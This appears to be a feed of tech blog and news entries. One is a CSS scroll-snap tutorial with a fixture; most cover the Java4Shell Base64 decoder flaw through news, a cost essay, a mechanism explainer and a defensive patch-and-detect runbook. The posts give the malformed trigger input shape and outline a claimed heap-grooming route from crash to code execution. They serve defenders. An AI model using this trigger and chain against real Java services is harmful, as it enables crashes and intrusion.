title: Keep CSS scroll snap targets visible below a fixed header
description:
A scroll-snap layout can select the correct section and still feel broken: the section heading lands beneath a fixed header. The snap rule is not necessarily wrong. The scrolling container simply has no knowledge that part of the visible area is occupied by persistent chrome.

The implementation decision is to reserve that shared space on the scroll container with scroll-padding-top, using the fixed header’s height. This changes the container’s effective snapport: when a section snaps to start, the browser treats the area below the header as the useful top edge. The section can retain its existing scroll-snap-align: start, and the container can retain mandatory vertical snapping.

That separation matters. Child alignment describes where a target aligns; scroll padding describes the usable viewing region in which it should become visible. Adding spacing to every section may appear to work, but it changes content geometry and repeats a viewport-level concern in each target. For a header shared by all targets, the scroller owns the offset.

The expected result is that later snapped headings appear below the fixed header without weakening snap strictness or moving heading content inside each section. A useful verification checks the geometric relationship, not only a scroll offset: after snapping, the heading’s top edge should be at or below the header’s bottom edge. It should also confirm that the original snap type and child alignment remain in place.

There is an important boundary case. The first target begins at scroll position zero, so a top padding offset cannot create negative scroll space above it. It may still sit beneath a fixed header. If targets need different individual offsets rather than one shared overlay allowance, child-level scroll-margin is the more appropriate tool. And if the interaction requires arbitrary pixel-perfect positioning rather than navigation through snap targets, reconsider whether scroll snap fits the interaction.

Working example 

export function snapFixture({ scrollPadding = false } = {}) {
  const paddingRule = scrollPadding ? 'scroll-padding-top: 50px;' : '';

  return `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <style>
    * { box-sizing: border-box; }
    html, body { margin: 0; height: 100%; overflow: hidden; }
    #scroller {
      height: 300px;
      width: 320px;
      overflow-y: auto;
      scroll-snap-type: y mandatory;
      ${paddingRule}
      border: 1px solid #345;
    }
    #fixed-header {
      position: fixed;
      top: 0;
      left: 0;
      z-index: 1;
      width: 320px;
      height: 50px;
      padding: 14px 12px;
      background: #172554;
      color: white;
      font: 16px sans-serif;
    }
    section {
      height: 300px;
      scroll-snap-align: start;
      padding: 0 12px;
      font: 16px sans-serif;
    }
    section:nth-child(odd) { background: #dbeafe; }
    section:nth-child(even) { background: #dcfce7; }
    h2 { margin: 0; padding-top: 0; line-height: 50px; }
  </style>
</head>
<body>
  <header id="fixed-header">Fixed header (50px)</header>
  <main id="scroller" tabindex="0" aria-label="Snapped sections">
    <section id="first"><h2>First section</h2></section>
    <section id="second"><h2>Second section</h2></section>
    <section id="third"><h2>Third section</h2></section>
  </main>
  <script>
    window.snapToSection = function snapToSection(name) {
      const section = document.getElementById(name);
      const scroller = document.getElementById('scroller');
      if (!section || !['first', 'second', 'third'].includes(name)) {
        throw new RangeError('Unknown snap target: ' + name);
      }

      // offsetTop includes the scroller border, while snapping is calculated from
      // its scrollable padding edge. Account for both that border and the
      // container-owned scroll padding before stopping short of the snap point.
      const scrollPaddingTop = parseFloat(getComputedStyle(scroller).scrollPaddingTop) || 0;
      const targetTop = section.offsetTop - scroller.offsetTop - scroller.clientTop - scrollPaddingTop;

      // Stop slightly before the adjusted target so mandatory snapping chooses
      // the container's actual snap point rather than relying on border offsets.
      scroller.scrollTo({ top: targetTop - 12 });
    };
  </script>
</body>
</html>`;
}

Read the full article: https://chriseugenerodriguez.com/blog/scroll-snap-fixed-header-scroll-padding

title: Java4Shell pode abrir acesso remoto por falha no decodificador Base64 do Java
description:
Falha no decodificador Base64

A Calif, startup de cibersegurança, anunciou a Java4Shell, vulnerabilidade no decodificador Base64 do Java que pode permitir acesso remoto não autorizado a sistemas internos. Segundo a empresa, o pesquisador Quang Luong identificou a falha com apoio do GPT-6 Cyber, modelo da OpenAI voltado à pesquisa de segurança digital.

A Calif afirma que o Java está presente em sistemas de cerca de 90% das empresas da lista Fortune 500 e é usado em bancos, hospitais, companhias aéreas, empresas de tecnologia e órgãos governamentais.

Como a falha pode ser explorada

O problema ocorre quando o decodificador processa uma sequência malformada: 64 letras A seguidas de um sinal de igual. O comportamento inesperado pode provocar operações indevidas na memória e, em condições normais, encerrar o processo. Os pesquisadores dizem ter usado heap grooming — a organização de dados na memória para influenciar o comportamento do programa — para avançar até um possível acesso não autorizado.

A Calif demonstrou a exploração no Keycloak, sistema de autenticação e gerenciamento de acesso usado por milhares de organizações, entre elas CERN, Hewlett Packard, UnitedHealthcare e NASA. O The New York Times informou ter verificado a descoberta de forma independente e relatou que o teste de demonstração levou menos de uma hora.

Correção e resposta das empresas

A Oracle publicou uma atualização de segurança na terça-feira, 17 de novembro. A Agência de Segurança Cibernética e de Infraestrutura dos Estados Unidos (CISA) recomendou que as organizações instalem a correção imediatamente. Google e Microsoft estavam entre as empresas notificadas durante a divulgação coordenada, que envolveu os países da aliança Five Eyes: Estados Unidos, Canadá, Austrália, Nova Zelândia e Reino Unido.

O Google afirmou que implementou proteções e atualizações em seus serviços após ser informado sobre a falha. Também desenvolveu mecanismos para verificar se ela havia sido explorada e publicou orientações para clientes.

IA e pesquisa de segurança

A Java4Shell é a segunda grande vulnerabilidade que a Calif diz ter identificado com auxílio de modelos da OpenAI nas últimas semanas. No mês anterior, a startup encontrou falhas no PHP. O caso mostra como a IA pode acelerar a busca por vulnerabilidades e a criação de demonstrações de exploração, ajudando equipes de defesa e também podendo reduzir o esforço necessário para ataques.

Thai Duong, diretor-executivo da Calif, afirmou que a exploração não é simples, o que dá tempo para empresas e desenvolvedores instalarem as correções. Ele alertou que sistemas sem atualização nos próximos cinco a dez anos ainda poderão ficar expostos. Na mesma semana, o FBI emitiu um alerta sobre hackers que estariam usando ferramentas autônomas de IA contra órgãos públicos e empresas em diferentes países.

Confira mais em: https://guiadeti.com.br/noticias/falha-java4shell-no-java-pode-permitir-acesso-remoto-a-sistemas-internos/

title: Calif Says AI Found Java4Shell (CVE-2026-114938) in an Hour for Under $200
description:
Calif Says AI Found Java4Shell (CVE-2026-114938) in an Hour for Under $200

Buried in the Java4Shell (CVE-2026-114938) coverage is a line most people scrolled past. The researchers at Calif say they found the bug with AI help in about an hour. They say a first working exploit took about two hours after that. And they say the whole thing cost under $200 in AI token costs.

Qualys repeats those numbers and attributes them to the researchers, and Upwind reports the one-hour and two-hour parts. Nobody has independently checked them. Treat them as a claim. But look at what happens if they are even roughly true.

TL;DR

Claim Source Checked by others
Bug found with AI help in about an hour Calif, via Upwind and Qualys No
First working exploit about two hours later Calif, via Upwind and Qualys No
Under $200 in AI token costs Calif, via Qualys No
Fix committed under embargo October 14, 2026 Endor Labs Single source
Public disclosure and Oracle fixes November 17, 2026 Qualys, Upwind, Endor Labs Four sources
Bug leaked before its patch Calif, via Upwind and Endor Labs No

Do the arithmetic on the defender side

Put the two clocks next to each other.

The discovery side, per Calif: about three hours of work from nothing to a working exploit, for a bill that fits on a corporate card without sign-off.

The defender side, from public dates: the fix landed on October 14, 2026 and the public advisory and vendor builds landed on November 17. That is 34 days between a committed fix and a public one. Endor Labs adds that on November 17 the public jdk17u, jdk21u and jdk25u repositories did not yet carry the fix, and that a South Korean advisory flagged an unauthenticated Java RCE a day earlier.

After the build exists, you still have to find every JVM, rebuild images and restart processes. The runbook in my earlier post covers that. That part is slow, and your change windows set its pace, not the clock.

I am not saying attackers will win that race. I am saying the race is now one where one side's cost fell through the floor, while the other side's cost is the same human approval chain it always was.

What the broader numbers say

I did not read the full reports, only the headlines, so take these as pointers and not evidence for this CVE.

The headline of Rapid7's 2026 annual threat report says exploited high and critical severity vulnerabilities surged 105 percent as attack timelines collapsed. A separate Rapid7 Q2 2026 release says nearly two thirds of exploited vulnerabilities needed no user interaction. A news summary of that quarter says newly exploited vulnerabilities jumped from 8 percent to 40 percent.

None of that proves AI is the cause. That fits a world where finding bugs got cheaper, and Java4Shell is a vivid example, if Calif's numbers hold.

The Token Tab, from the other side

I have written before about the bill AI tools quietly send you. This is the reverse entry. Someone else's tokens are now a line item on your risk register. By Calif's account, the discovery took one engineer, some prompts and an afternoon.

The honest caveats matter here. Calif says it holds back its product-specific exploits and there is no universal one. The sources I read show no public proof-of-concept shell. Equixly calls code execution unproven and a crash the realistic outcome. A cheap discovery does not mean a cheap, reliable exploit against your particular deployment.

What I would change in my own process

Three policy changes follow from a cheap-discovery world, and none of them need a new product.

First, measure your restart latency. Patching a file does not fix a running JVM. How long does it take your slowest service to go from "fixed build available" to "process restarted on the fixed build"? If you cannot answer, that is your real patch window.

Second, tie your deadline to exposure instead of a flat number. Qualys orders its priorities as internet-facing identity providers first, then Jira, Confluence, Jenkins and Artifactory, then other internet-facing Java services, then internal data systems.

Third, keep a runtime inventory that is always on. The Java4Shell exposure depends on the JDK build and the CPU feature, and neither shows up in a dependency scan.

A triage script

This script takes the inventory output from the runbook, one line per JVM (pid, path, version), plus an AVX-512 flag, and sorts each into patched, exposed or not affected using the version ranges Qualys and Upwind list. It does not check for vendor-specific builds, so a version number that passes is not a promise. Confirm against the vendor advisory.

#!/usr/bin/env python3
"""java4shell_triage.py: classify JVM versions against the published ranges.

Input: lines of "pid<TAB>path<TAB>version" on stdin, e.g. 17.0.19, 21.0.13.
Usage: python3 java4shell_triage.py --avx512 < inventory.tsv
"""
import argparse
import re
import sys

# line -> first affected, first fixed (Qualys and Upwind, November 17, 2026)
RANGES = {
    17: ((17, 0, 6), (17, 0, 21, 1)),
    21: ((21, 0, 0), (21, 0, 13, 1)),
    25: ((25, 0, 0), (25, 0, 5, 1)),
    27: ((27, 0, 0), (27, 0, 1, 1)),
}


def parse(version: str) -> tuple:
    nums = [int(n) for n in re.findall(r"\d+", version)[:5]]
    return tuple(nums)


def pad(t: tuple, n: int = 5) -> tuple:
    return t + (0,) * (n - len(t))


def classify(version: str, avx512: bool) -> str:
    v = parse(version)
    if not v or v[0] not in RANGES:
        return "not-affected-or-unknown"
    first_bad, first_fixed = RANGES[v[0]]
    if pad(v) < pad(first_bad) or pad(v) >= pad(first_fixed):
        return "not-affected-or-fixed"
    return "EXPOSED" if avx512 else "vulnerable-code-no-avx512"


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--avx512", action="store_true", help="host has all four AVX-512 flags")
    args = ap.parse_args()
    for line in sys.stdin:
        parts = line.rstrip("\n").split("\t")
        if len(parts) < 3:
            continue
        pid, path, version = parts[0], parts[1], parts[2]
        print(f"{classify(version, args.avx512):28} pid={pid} {version} {path}")


if __name__ == "__main__":
    main()

The middle state matters. A host without AVX-512 VBMI runs vulnerable code that cannot reach the bad path today. Qualys warns that a resize or instance change can move a workload onto an affected CPU later, so that state deserves a ticket, not a shrug.

The bottom line

The part of Java4Shell that will age best is not the 62-byte overflow. It is a line in a vendor blog post saying someone did the discovery work in an afternoon with a model. Even if those exact numbers fail scrutiny, plan your patch process for the version of the world where they do.

If a bug like this took three hours and under $200 to find, how long does your slowest service take to restart?

GDS K S · thegdsks.com · building Glincker · follow on X @thegdsks

Cheap discovery moves the bottleneck to your restart window.

Sources: Qualys, Upwind, Endor Labs, Equixly, Rapid7 Q2 2026 release.

title: Attackers Used Optimizely to A/B Test Malware on Top Websites
description: At least 178 top web destinations unwittingly served a variety of malware exploits against visitors over the past 24 hours thanks to a security vulnerability involving Optimizely, a company that helps websites customize user experiences and test out new features. Experts say the incident, which saw data-stealing malicious software silently injected into sites like the BBC, CNN, Equifax, Ledger and Zoom, was exacerbated by the reality that few popular websites enforce strict rules on the sources of third-party content.

title: How One Base64 Bug Can Leak Your Java Heap (Java4Shell, CVE-2026-114938)
description:
How One Base64 Bug Can Leak Your Java Heap (Java4Shell, CVE-2026-114938)

Most Java4Shell (CVE-2026-114938) coverage on day one was either "your servers are on fire" or "it only crashes the JVM." Both skip the mechanism, and the mechanism tells you who is at risk. This post walks through why the bug exists, what the sources actually established, and what a defender can watch for.

I have not reproduced the bug. Everything below comes from public write-ups by Upwind, Endor Labs, Equixly, Qualys and Calif, and I flag where they disagree.

TL;DR

Claim Status
Heap write past the output array on x86-64 with AVX-512 VBMI Reproduced by Endor Labs (under an emulator) and Upwind (on real hardware)
JVM crash from a remote request Consistent across sources
Pre-auth RCE in named products Claimed by Calif, no public proof-of-concept
Attacker-controlled write contents Not supported, the written bytes are constant
Exploited in the wild None reported, not in CISA KEV as of November 17

Why an intrinsic exists at all

HotSpot ships a pure-Java Base64 decoder. When the JIT sees that decoder running hot, it can replace the Java loop with an intrinsic, a hand-written assembly stub for the target CPU. On x86-64 with AVX-512 VBMI, the stub decodes wide blocks at once.

Equixly makes two points that matter for exposure. The intrinsic replaces the Java code only after the JIT compiles the decoder, which on a busy server happens within seconds. And the vector path only engages above a length threshold. Endor Labs gives the threshold as 31 bytes on Java 21, 25 and 27, and 128 bytes on Java 17.

That is why the shortest triggers differ by version. 65 characters is enough on 21, 25 and 27. 17 needs 129.

The tail bug

The block loop handles most of the input. The last characters, including padding, go through a tail routine. Per Upwind, a malformed string ending in a stray = makes the tail calculate a negative output length. A small write becomes a full 64-byte write, 62 bytes beyond the end of the output array. Endor Labs measured 62 bytes for a single = tail and 63 for ==.

Two properties follow from the measurements.

First, the overflow content is fixed. Endor Labs says the bytes stay the same regardless of the input data. An attacker controls the length of the input and the heap layout around the destination array, not the bytes that get written.

Second, Java still rejects the input afterwards with an IllegalArgumentException. The exception is a useful tell, as the detection section below shows, but it fires after the damage.

Upwind also ran 300,000 well-formed inputs and saw no overflow, so ordinary traffic is not at risk. The trigger is a malformed string.

What the fix looks like

Endor Labs reports the fix as JDK-8393212, "Base64 optimization improvements," a four-line change that adds a guard before the size computation and routes short padded tails to the scalar path. Engineers committed it under embargo on October 14, 2026. Endor Labs also notes that on November 17 the public jdk17u, jdk21u and jdk25u repositories did not yet carry the fix, while Oracle's builds had shipped.

The vulnerable code arrived in 17.0.6 in January 2023 through a backport from JDK 18, and Equixly flags the 17.0.6 starting point as its own inference from backport history.

From crash to code execution

The crash path is simple. If the 62 stray bytes land on a live object, they overwrite its header, and the usual result is a SIGSEGV inside garbage collection, per Endor Labs. Equixly warns the crash log will not mention Base64, because the garbage collector reads the damaged object later.

Calif claims much more, in five stages.

Stage Claimed step
1 Corrupt an array length
2 Corrupt a second array to leak heap contents, which Calif calls JavaBleed
3 Repair object headers so the JVM keeps running
4 Groom the heap remotely so the overflow lands on a chosen object
5 Write into the JVM code cache

Endor Labs marks every one of these as Calif's claim. Calif says there is no universal exploit, and that each target needs its own decoder route, writable buffer, readable feedback channel and heap layout. The sources I read do not discuss address space randomization at all, so I will not call it a barrier or a bypass.

This is why your exposure depends on the application and not just the JVM. A service that decodes attacker data with Base64.getDecoder() on a hot path, and reflects some of the result, has the shape Calif describes. A service that never decodes attacker input is a crash risk at worst. Whether HTTP Basic or JWT parsing in a given product qualifies is an open question in the sources, so I treat it as unknown.

What does not reach the bug

Per the write-ups, these cases never reach the bug.

  • The MIME decoder takes the scalar path.
  • Third-party Base64 libraries that do not call java.util.Base64 do not reach the intrinsic.
  • ARM64 hosts, including Graviton, Ampere and Apple silicon, have no such stub. Equixly ran 794 crafted inputs on Temurin 17.0.21 for arm64 and saw no stray writes.
  • x86-64 without AVX-512 VBMI, such as Skylake-SP, Cascade Lake and AMD before Zen 4.

One discrepancy to know about: Equixly requires AVX-512 BW as well as VBMI, while Cyber Security News names only VBMI. Qualys lists four CPU flags (avx512f, avx512bw, avx512vbmi, bmi2) and says all four must appear.

Detection engineering

You cannot detect this with a dependency scan, since the flaw is in the runtime. You detect it at the edge, in the logs and on the host.

Edge rules

The malformed shape is checkable without decoding. Padded Base64 has a length divisible by 4, so a token ending in = or == with a length that is not a multiple of 4 fails on sight. Upwind's heuristic adds a size floor of 32 characters. Endor Labs suggests 65 as the lower bound when you run mixed Java versions. Equixly offers this rule for the Authorization header.

^Basic\s+(?:\S{4})*\S{0,2}=$

I have not tested it. Run it in log-only mode against production traffic first, because a wrong rule that blocks real logins is its own outage.

Application logs

Every trigger throws after the write. A burst of IllegalArgumentException from java.util.Base64 in a request handler, clustered by source address, is the signal Endor Labs recommends. Paced or fragmented Base64 traffic at a high rate from one source fits the same pattern, since heap grooming needs repeated attempts.

Host signals

  • New hs_err_pid*.log files with a SIGSEGV in a GC copy routine and a compiled Base64$Decoder.decode0 frame
  • Repeated JVM restarts of one service
  • Java processes that spawn a shell or open new outbound connections
  • Oversized or binary-looking responses from endpoints that echo decoded input, which would match the leak stage Calif describes 
# Recent JVM crash logs and their crash lines
find / -name 'hs_err_pid*.log' -mtime -2 2>/dev/null | while read -r f; do
  echo "$f"; grep -m1 -E '^# (SIGSEGV|Problematic frame)' "$f"
done

A crash log alone is not evidence of an attack. JVMs crash for plenty of other reasons. A cluster of crashes that line up with decode-heavy requests from one source is.

Where the sources disagree

I kept a list while reading, and you should keep your own.

  • Oracle's status. Equixly wrote that the fix was still pending. Qualys, Upwind and Cyber Security News say Oracle shipped fixed builds on November 17.
  • Severity. Qualys attributes the 9.2 (CVSS 4.0) to the researchers, Equixly to South Korea's NCSC, and nobody has published a vector string. Cyber Security News calls the 8.1 (CVSS 3.1) the OpenJDK advisory score, and Equixly says Oracle has not said which of its November flaws carries that score.
  • Java 8. Qualys and Cyber Security News list Oracle's 8u511b33-perf Performance Pack as affected. The same sources call standard Java 8 not affected.
  • The CVE mapping. Endor Labs marks the mapping from this bug to CVE-2026-114938 as not confirmed, because it could not retrieve the OpenJDK advisory. Check the CVE record yourself before you cite it in a ticket.

The bottom line

The mechanism is narrow: one assembly tail, one hardware feature, one malformed input shape. The reach is wide, because it sits in the runtime that bundled products carry. The honest status on November 17 is a proven crash, a claimed code execution chain and a patch that exists.

If you only do one thing, put a malformed-padding check in front of your Base64 decoding paths and an alert on the exception, then patch on your normal fast track. If a public exploit lands next week, you will already be watching the right signal.

What would you want your WAF to tell you about a bug class it cannot see inside the runtime?

GDS K S · thegdsks.com · building Glincker · follow on X @thegdsks

A bug in the runtime is a bug in everything that runs on it.

Sources: Upwind, Endor Labs, Equixly, Qualys, Cyber Security News, Calif.

title: Java4Shell CVE-2026-114938: Is Your Server Next? Find Every Vulnerable JVM
description:
Java4Shell CVE-2026-114938: Is Your Server Next? Find Every Vulnerable JVM

CVE-2026-114938 (Java4Shell) is a heap out-of-bounds write in OpenJDK's AVX-512 Base64 decoder. I covered the background in a separate post. This one is the runbook: how to find the JVMs that matter, what to run, what to change and how to prove it worked.

I have not run this against a vulnerable machine. The commands come from the Qualys, Upwind, Endor Labs and Equixly write-ups, and I only checked that the shell and Java snippets parse. Test in staging first.

TL;DR

Step Goal Time
1. Inventory Find the real runtime behind every Java process minutes per host
2. Hardware check Split hosts by AVX-512 VBMI seconds
3. Patch Move to a vendor build that carries the fix your restart window
4. Mitigate Apply a JVM flag where you cannot patch one restart
5. Verify Prove the flag or build is live in the running process seconds
6. Watch Alert on crash and decode patterns ongoing

1. Inventory the JVM that actually runs

Your shell's java tells you very little. Jenkins, Jira, Confluence, Keycloak and Elasticsearch ship or select their own runtime. Equixly and Endor Labs both call this out. Ask the process.

#!/usr/bin/env bash
# jvm-inventory.sh: one line per running JVM with its real binary and version
set -u
for pid in $(pgrep -f '[j]ava'); do
  exe=$(readlink -f "/proc/$pid/exe" 2>/dev/null || echo unknown)
  ver=$(jcmd "$pid" VM.version 2>/dev/null | grep -m1 -E 'JDK|OpenJDK' || echo "jcmd unavailable")
  printf '%s\t%s\t%s\n' "$pid" "$exe" "$ver"
done

jcmd must run as the same user as the target JVM. If it prints "jcmd unavailable", the process may be a minimal runtime without the JDK tools. Fall back to "$exe" -version.

Version triage, using the ranges Qualys and Upwind list.

Line Affected Fixed Oracle build
17 17.0.6 and later, before the fix 17.0.21.1
21 up to 21.0.13 21.0.13.1
25 up to 25.0.5 25.0.5.1
27 up to 27.0.1 27.0.1.1
8 Oracle Enterprise Performance Pack 8u511b33-perf 8u513-perf
11, 17.0.0 to 17.0.5, standard 8 not affected none needed

A version number is not proof. Endor Labs warns that an LTS build with a matching number may still lack the commit, because the fix is tracked as JDK-8393212. Treat the vendor advisory as the source of truth, and note that Qualys lists Corretto 17.0.21.1.2 as released.

2. Check the hardware

Only x86-64 hosts with AVX-512 VBMI reach the vulnerable routine. Run this on each host or container node.

grep -m1 '^flags' /proc/cpuinfo | tr ' ' '\n' | grep -E '^(avx512f|avx512bw|avx512vbmi|bmi2)$' | sort

Per Qualys, you are on the hardware side of the risk only when all four flags appear. Intel Ice Lake and later server parts and AMD Zen 4 and later qualify. ARM64, including Graviton and Apple silicon, does not.

In Kubernetes, pods inherit the node's CPU, so check the node and not the image.

# Which nodes would run the vulnerable path
for node in $(kubectl get nodes -o name); do
  pod="cpucheck-${node#node/}"
  kubectl debug "$node" -q --image=busybox --profile=general -- \
    sh -c "grep -m1 '^flags' /proc/cpuinfo | tr ' ' '\n' | grep -c avx512vbmi" 2>/dev/null \
    | sed "s|^|$node  avx512vbmi=|"
done

Remember Qualys's caution: a resize or an instance family change can move a workload onto an affected CPU later. A host that passes today is not a permanent pass.

3. Patch

Patching is the only complete fix, and the vendors say so. The steps that bite people are all about the running process.

  • Rebuild container images from a base that carries the fixed JDK, then redeploy. Replacing files on disk does not change a JVM that is already running.
  • Restart every Java process. Without a restart you have patched a file, not a process.
  • For bundled runtimes, take the application vendor's update, not a hand-swapped JDK, unless the vendor documents it.
  • For Temurin, Zulu, Microsoft, Red Hat and distro packages, confirm the fixed build in the vendor advisory. Equixly could not confirm those on November 17.

4. Mitigate where you cannot patch yet

Both Qualys and Upwind recommend one flag first.

-XX:-UseBASE64Intrinsics

It turns off the fast decoder on any architecture. Qualys warns that large Base64 workloads may slow down, and Upwind reports it stopped the overflow on every affected version they tested. In a container, set it through the environment.

ENV JAVA_TOOL_OPTIONS="-XX:-UseBASE64Intrinsics"

Two alternatives appear in the write-ups, and each has a trap.

Flag Trap
-XX:UseAVX=2 Disables all AVX-512, so it can slow unrelated work. On ARM the JVM refuses to start.
-XX:DisableIntrinsic=_base64_decodeBlock Without -XX:+UnlockDiagnosticVMOptions the JVM will not start. Pushed through JAVA_TOOL_OPTIONS, Upwind calls it a fleet-wide outage.

A reverse proxy is not a control. Qualys says so plainly, and CISA's size-limit advice does not stop this bug on its own.

5. Verify in the running process

Setting a flag in a manifest proves nothing until you ask the process.

# Flag state inside a live JVM
jcmd <pid> VM.flags | tr ' ' '\n' | grep -E 'UseBASE64Intrinsics|UseAVX'

# Or ask a fresh JVM what it would do with your options
java -XX:+PrintFlagsFinal -version | grep -E 'UseAVX|UseBASE64Intrinsics'

You want UseBASE64Intrinsics = false in the process. Remove the flag after the patch lands, because it costs speed.

6. A guard in your own code

If you decode untrusted Base64 with java.util.Base64, you can reject the malformed shape before the decoder sees it. Upwind's detection heuristic is a Base64-alphabet token of 32 or more characters that ends in = and whose length is not a multiple of 4. Well-formed padded Base64 always has a length divisible by 4.

import java.util.Base64;

public final class SafeBase64 {
    private SafeBase64() {}

    /** Rejects padded input whose length cannot be valid Base64 before decoding. */
    public static byte[] decode(String input) {
        if (input.endsWith("=") && input.length() % 4 != 0) {
            throw new IllegalArgumentException("malformed base64 padding");
        }
        return Base64.getDecoder().decode(input);
    }
}

This is defense in depth. It narrows the input, and it does not replace the patch. I have not tested it against Calif's chains, which are unpublished.

7. Detection

Endor Labs and Equixly suggest the same few signals.

  • Authorization headers or request fields where Base64 ends in = or == and the length is not a multiple of 4. Equixly offers a WAF rule for the header: ^Basic\s+(?:\S{4})*\S{0,2}=$. I have not validated it.
  • Bursts of IllegalArgumentException from java.util.Base64 in request handlers, because every trigger throws after the write.
  • New hs_err_pid*.log files. Equixly warns the log will not name Base64, because the crash comes later when the garbage collector reads the damaged object. Endor Labs describes a SIGSEGV in a GC copy routine with a compiled Base64$Decoder.decode0 frame, clustered by source IP.
  • Java processes that start a shell or open new outbound connections, which Qualys lists as a monitoring signal. 
# Quick sweep for recent JVM crash logs and their crash frame
find / -name 'hs_err_pid*.log' -mtime -2 2>/dev/null | while read -r f; do
  echo "$f"; grep -m1 -E '^# (SIGSEGV|Problematic frame)' "$f"
done

8. Priorities

Qualys orders the work like this: internet-facing identity providers first, then Jira, Confluence, Jenkins and Artifactory, then other internet-facing Java services, then internal Kafka, Solr, Elasticsearch, Gerrit and Spinnaker. The first group is first because Calif's pre-auth claims name them.

The bottom line

The slow part of this incident will not be the patch. It will be learning which of your processes are Java and which JDK they use. Run the inventory script once, keep its output, and you will have the answer ready for the next runtime bug too.

How many of your JVMs would the script find that nobody on your team knew about?

GDS K S · thegdsks.com · building Glincker · follow on X @thegdsks

You cannot patch a runtime you have not inventoried.

Sources: Qualys, Upwind, Endor Labs, Equixly, CISA alert.

title: Java4Shell (CVE-2026-114938): The Bug That Leaked Before Its Patch
description:
Java4Shell (CVE-2026-114938): The Bug That Leaked Before Its Patch

On November 17, 2026, a security firm called Calif published a write-up titled "Write once, RCE everywhere." The bug it describes, tracked as CVE-2026-114938 and nicknamed Java4Shell, lives in java.util.Base64, a class most of us have called without a second thought. Endor Labs calls the fix four lines. The names on the affected list are Keycloak, Jira, Confluence, Artifactory, Jenkins and PingFederate.

I spent the day reading the advisories and vendor write-ups so you don't have to. Some of what you will see on social media has a reproduction behind it. Some is Calif's claim with no public proof yet. I'll keep the two apart, because the difference decides how fast you need to move.

TL;DR

Question Short answer
What is it CVE-2026-114938, nicknamed Java4Shell, a heap out-of-bounds write in OpenJDK's hardware-accelerated Base64 decoder
How big is the write 62 bytes past the end of the output array, per Upwind and Endor Labs
Who is at risk HotSpot 17.0.6 and later, plus 21, 25 and 27, on x86-64 CPUs with AVX-512 VBMI
Who is not ARM64, older Xeons, AMD before Zen 4, Java 8 and 11 (standard builds), and the MIME decoder
Exploitation No exploitation in the wild reported, not in CISA KEV as of November 17
Is there a fix Oracle shipped fixed builds on November 17, other vendors on their own schedules

How a Base64 string becomes a crash

Base64 decoding is boring work, so HotSpot does not do it in plain Java. Once the JIT decides the decoder is hot, it swaps the Java loop for a hand-written assembly routine that uses AVX-512 to chew through the input in wide chunks. That gives the speedup, and it also hosts the bug.

The routine has a special path for the last characters of the string. Per Upwind, a malformed string that ends in a stray = makes that tail code calculate a negative output length. A small write turns into a full 64-byte write, 62 bytes past the end of the array. Java then notices the input is invalid and throws an exception. By that point the bytes are already in memory.

Those bytes are a constant. Endor Labs says the content of the overflow is the same whatever you send. The attacker does not choose what gets written. They choose where it lands by shaping the heap.

If the bytes land in free memory, nothing happens. If they land on a live object, they destroy its header. Endor Labs puts the usual result as a SIGSEGV inside garbage collection. That is the part everyone agrees on: a remotely triggerable JVM crash.

The part people argue about

Calif says the overflow escalates much further. In their write-up, a chain of five stages corrupts an array length, uses a second array to leak heap contents, repairs object headers, grooms the heap remotely and finally writes into the JVM's code cache. Their claimed results are pre-auth RCE on default installs of Keycloak, Jira, Confluence, Artifactory, Jenkins and PingFederate, and post-auth RCE on Kafka, Solr, Elasticsearch, Gerrit and Spinnaker.

Here is what I could and could not confirm.

  • Calif reports that they found the bug with AI help in about an hour and had a first working exploit about two hours later. That is their timeline, not an independently checked one.
  • No public proof-of-concept shell exists. Calif is withholding the product-specific exploits and published a safe reproducer only.
  • Calif itself says there is no universal exploit. Each target needs its own decoder route, writable buffer, feedback channel and heap layout.
  • Equixly, writing the same day, calls RCE unproven and calls a JVM crash the realistic outcome.

Both readings can be true at once. A crash needs no skill. Code execution needs a skilled attacker per product, but the defenders' clock is Calif's own statement that product exploits will follow.

The numbers that matter

Number What it is Source
62 Bytes written past the array for a single = tail (63 for ==) Upwind, Endor Labs
65 Shortest trigger length on Java 21, 25 and 27 Endor Labs, Equixly
129 Shortest trigger length on Java 17 Endor Labs, Equixly
9.2 CVSS 4.0 score, attributed to the researchers Qualys, Endor Labs
8.1 Oracle's CVSS 3.1 score for the November update Qualys, Endor Labs
11 Java SE fixes in Oracle's November update, all remotely exploitable without auth Endor Labs
Jan 2023 Backport of the vulnerable decoder into 17.0.6 Endor Labs
Oct 14, 2026 Fix committed under embargo Endor Labs

The sources disagree on several details. Equixly attributes the 9.2 score to South Korea's NCSC while the others attribute it to Calif, and nobody has published a CVSS vector string. Treat the score as a signal, not a measurement.

Why this one has legs

Three things make this more than a routine patch Tuesday item.

The first is the reach. This is not a library you can grep for in a lockfile. The flaw sits in the runtime itself, so dependency scanning of pom.xml or build.gradle will not surface it. Endor Labs says so directly, and that is the main reason I expect this to linger in fleets for months.

The second is that you can be vulnerable by accident of hardware. Qualys warns that a workload on an unaffected CPU can land on an affected one after a resize or an instance type change. The same container image, the same JVM flags, a different answer.

The third is the leak. Per Upwind and Endor Labs, the bug reportedly leaked before its patch was ready. The NCSC in South Korea told public institutions to inspect their Java runtimes on November 16, a day before the fix shipped.

What I would do before lunch

Start by finding out which JVM each service really runs. The java on your shell path is often not the one your service uses, especially for Jenkins, Jira, Confluence, Keycloak and Elasticsearch, which bundle their own runtime.

# The real runtime behind a running service, not the first java on PATH
for pid in $(pgrep -f '[j]ava'); do
  echo "pid $pid  $(readlink -f /proc/$pid/exe)"
  jcmd "$pid" VM.version 2>/dev/null | sed -n '2,3p'
done

# Does this host have the CPU feature at all
grep -m1 '^flags' /proc/cpuinfo | tr ' ' '\n' | grep -E '^(avx512f|avx512bw|avx512vbmi|bmi2)$'

Qualys says a host meets the hardware condition only when all four flags appear. If the second command prints nothing, the host is not exposed to this particular code path, though I would still patch it.

Then patch. The Oracle fixed builds named by Qualys are 17.0.21.1, 21.0.13.1, 25.0.5.1 and 27.0.1.1, and Corretto 17.0.21.1.2. For Temurin, Zulu, Microsoft, Red Hat and your distro packages, check the vendor advisory, because I could not confirm their fixed builds today. Remember that a running JVM does not change when you replace files on disk. Rebuild images and restart processes.

If you cannot patch today, the workaround both Qualys and Upwind recommend is a JVM flag.

java -XX:-UseBASE64Intrinsics -jar app.jar

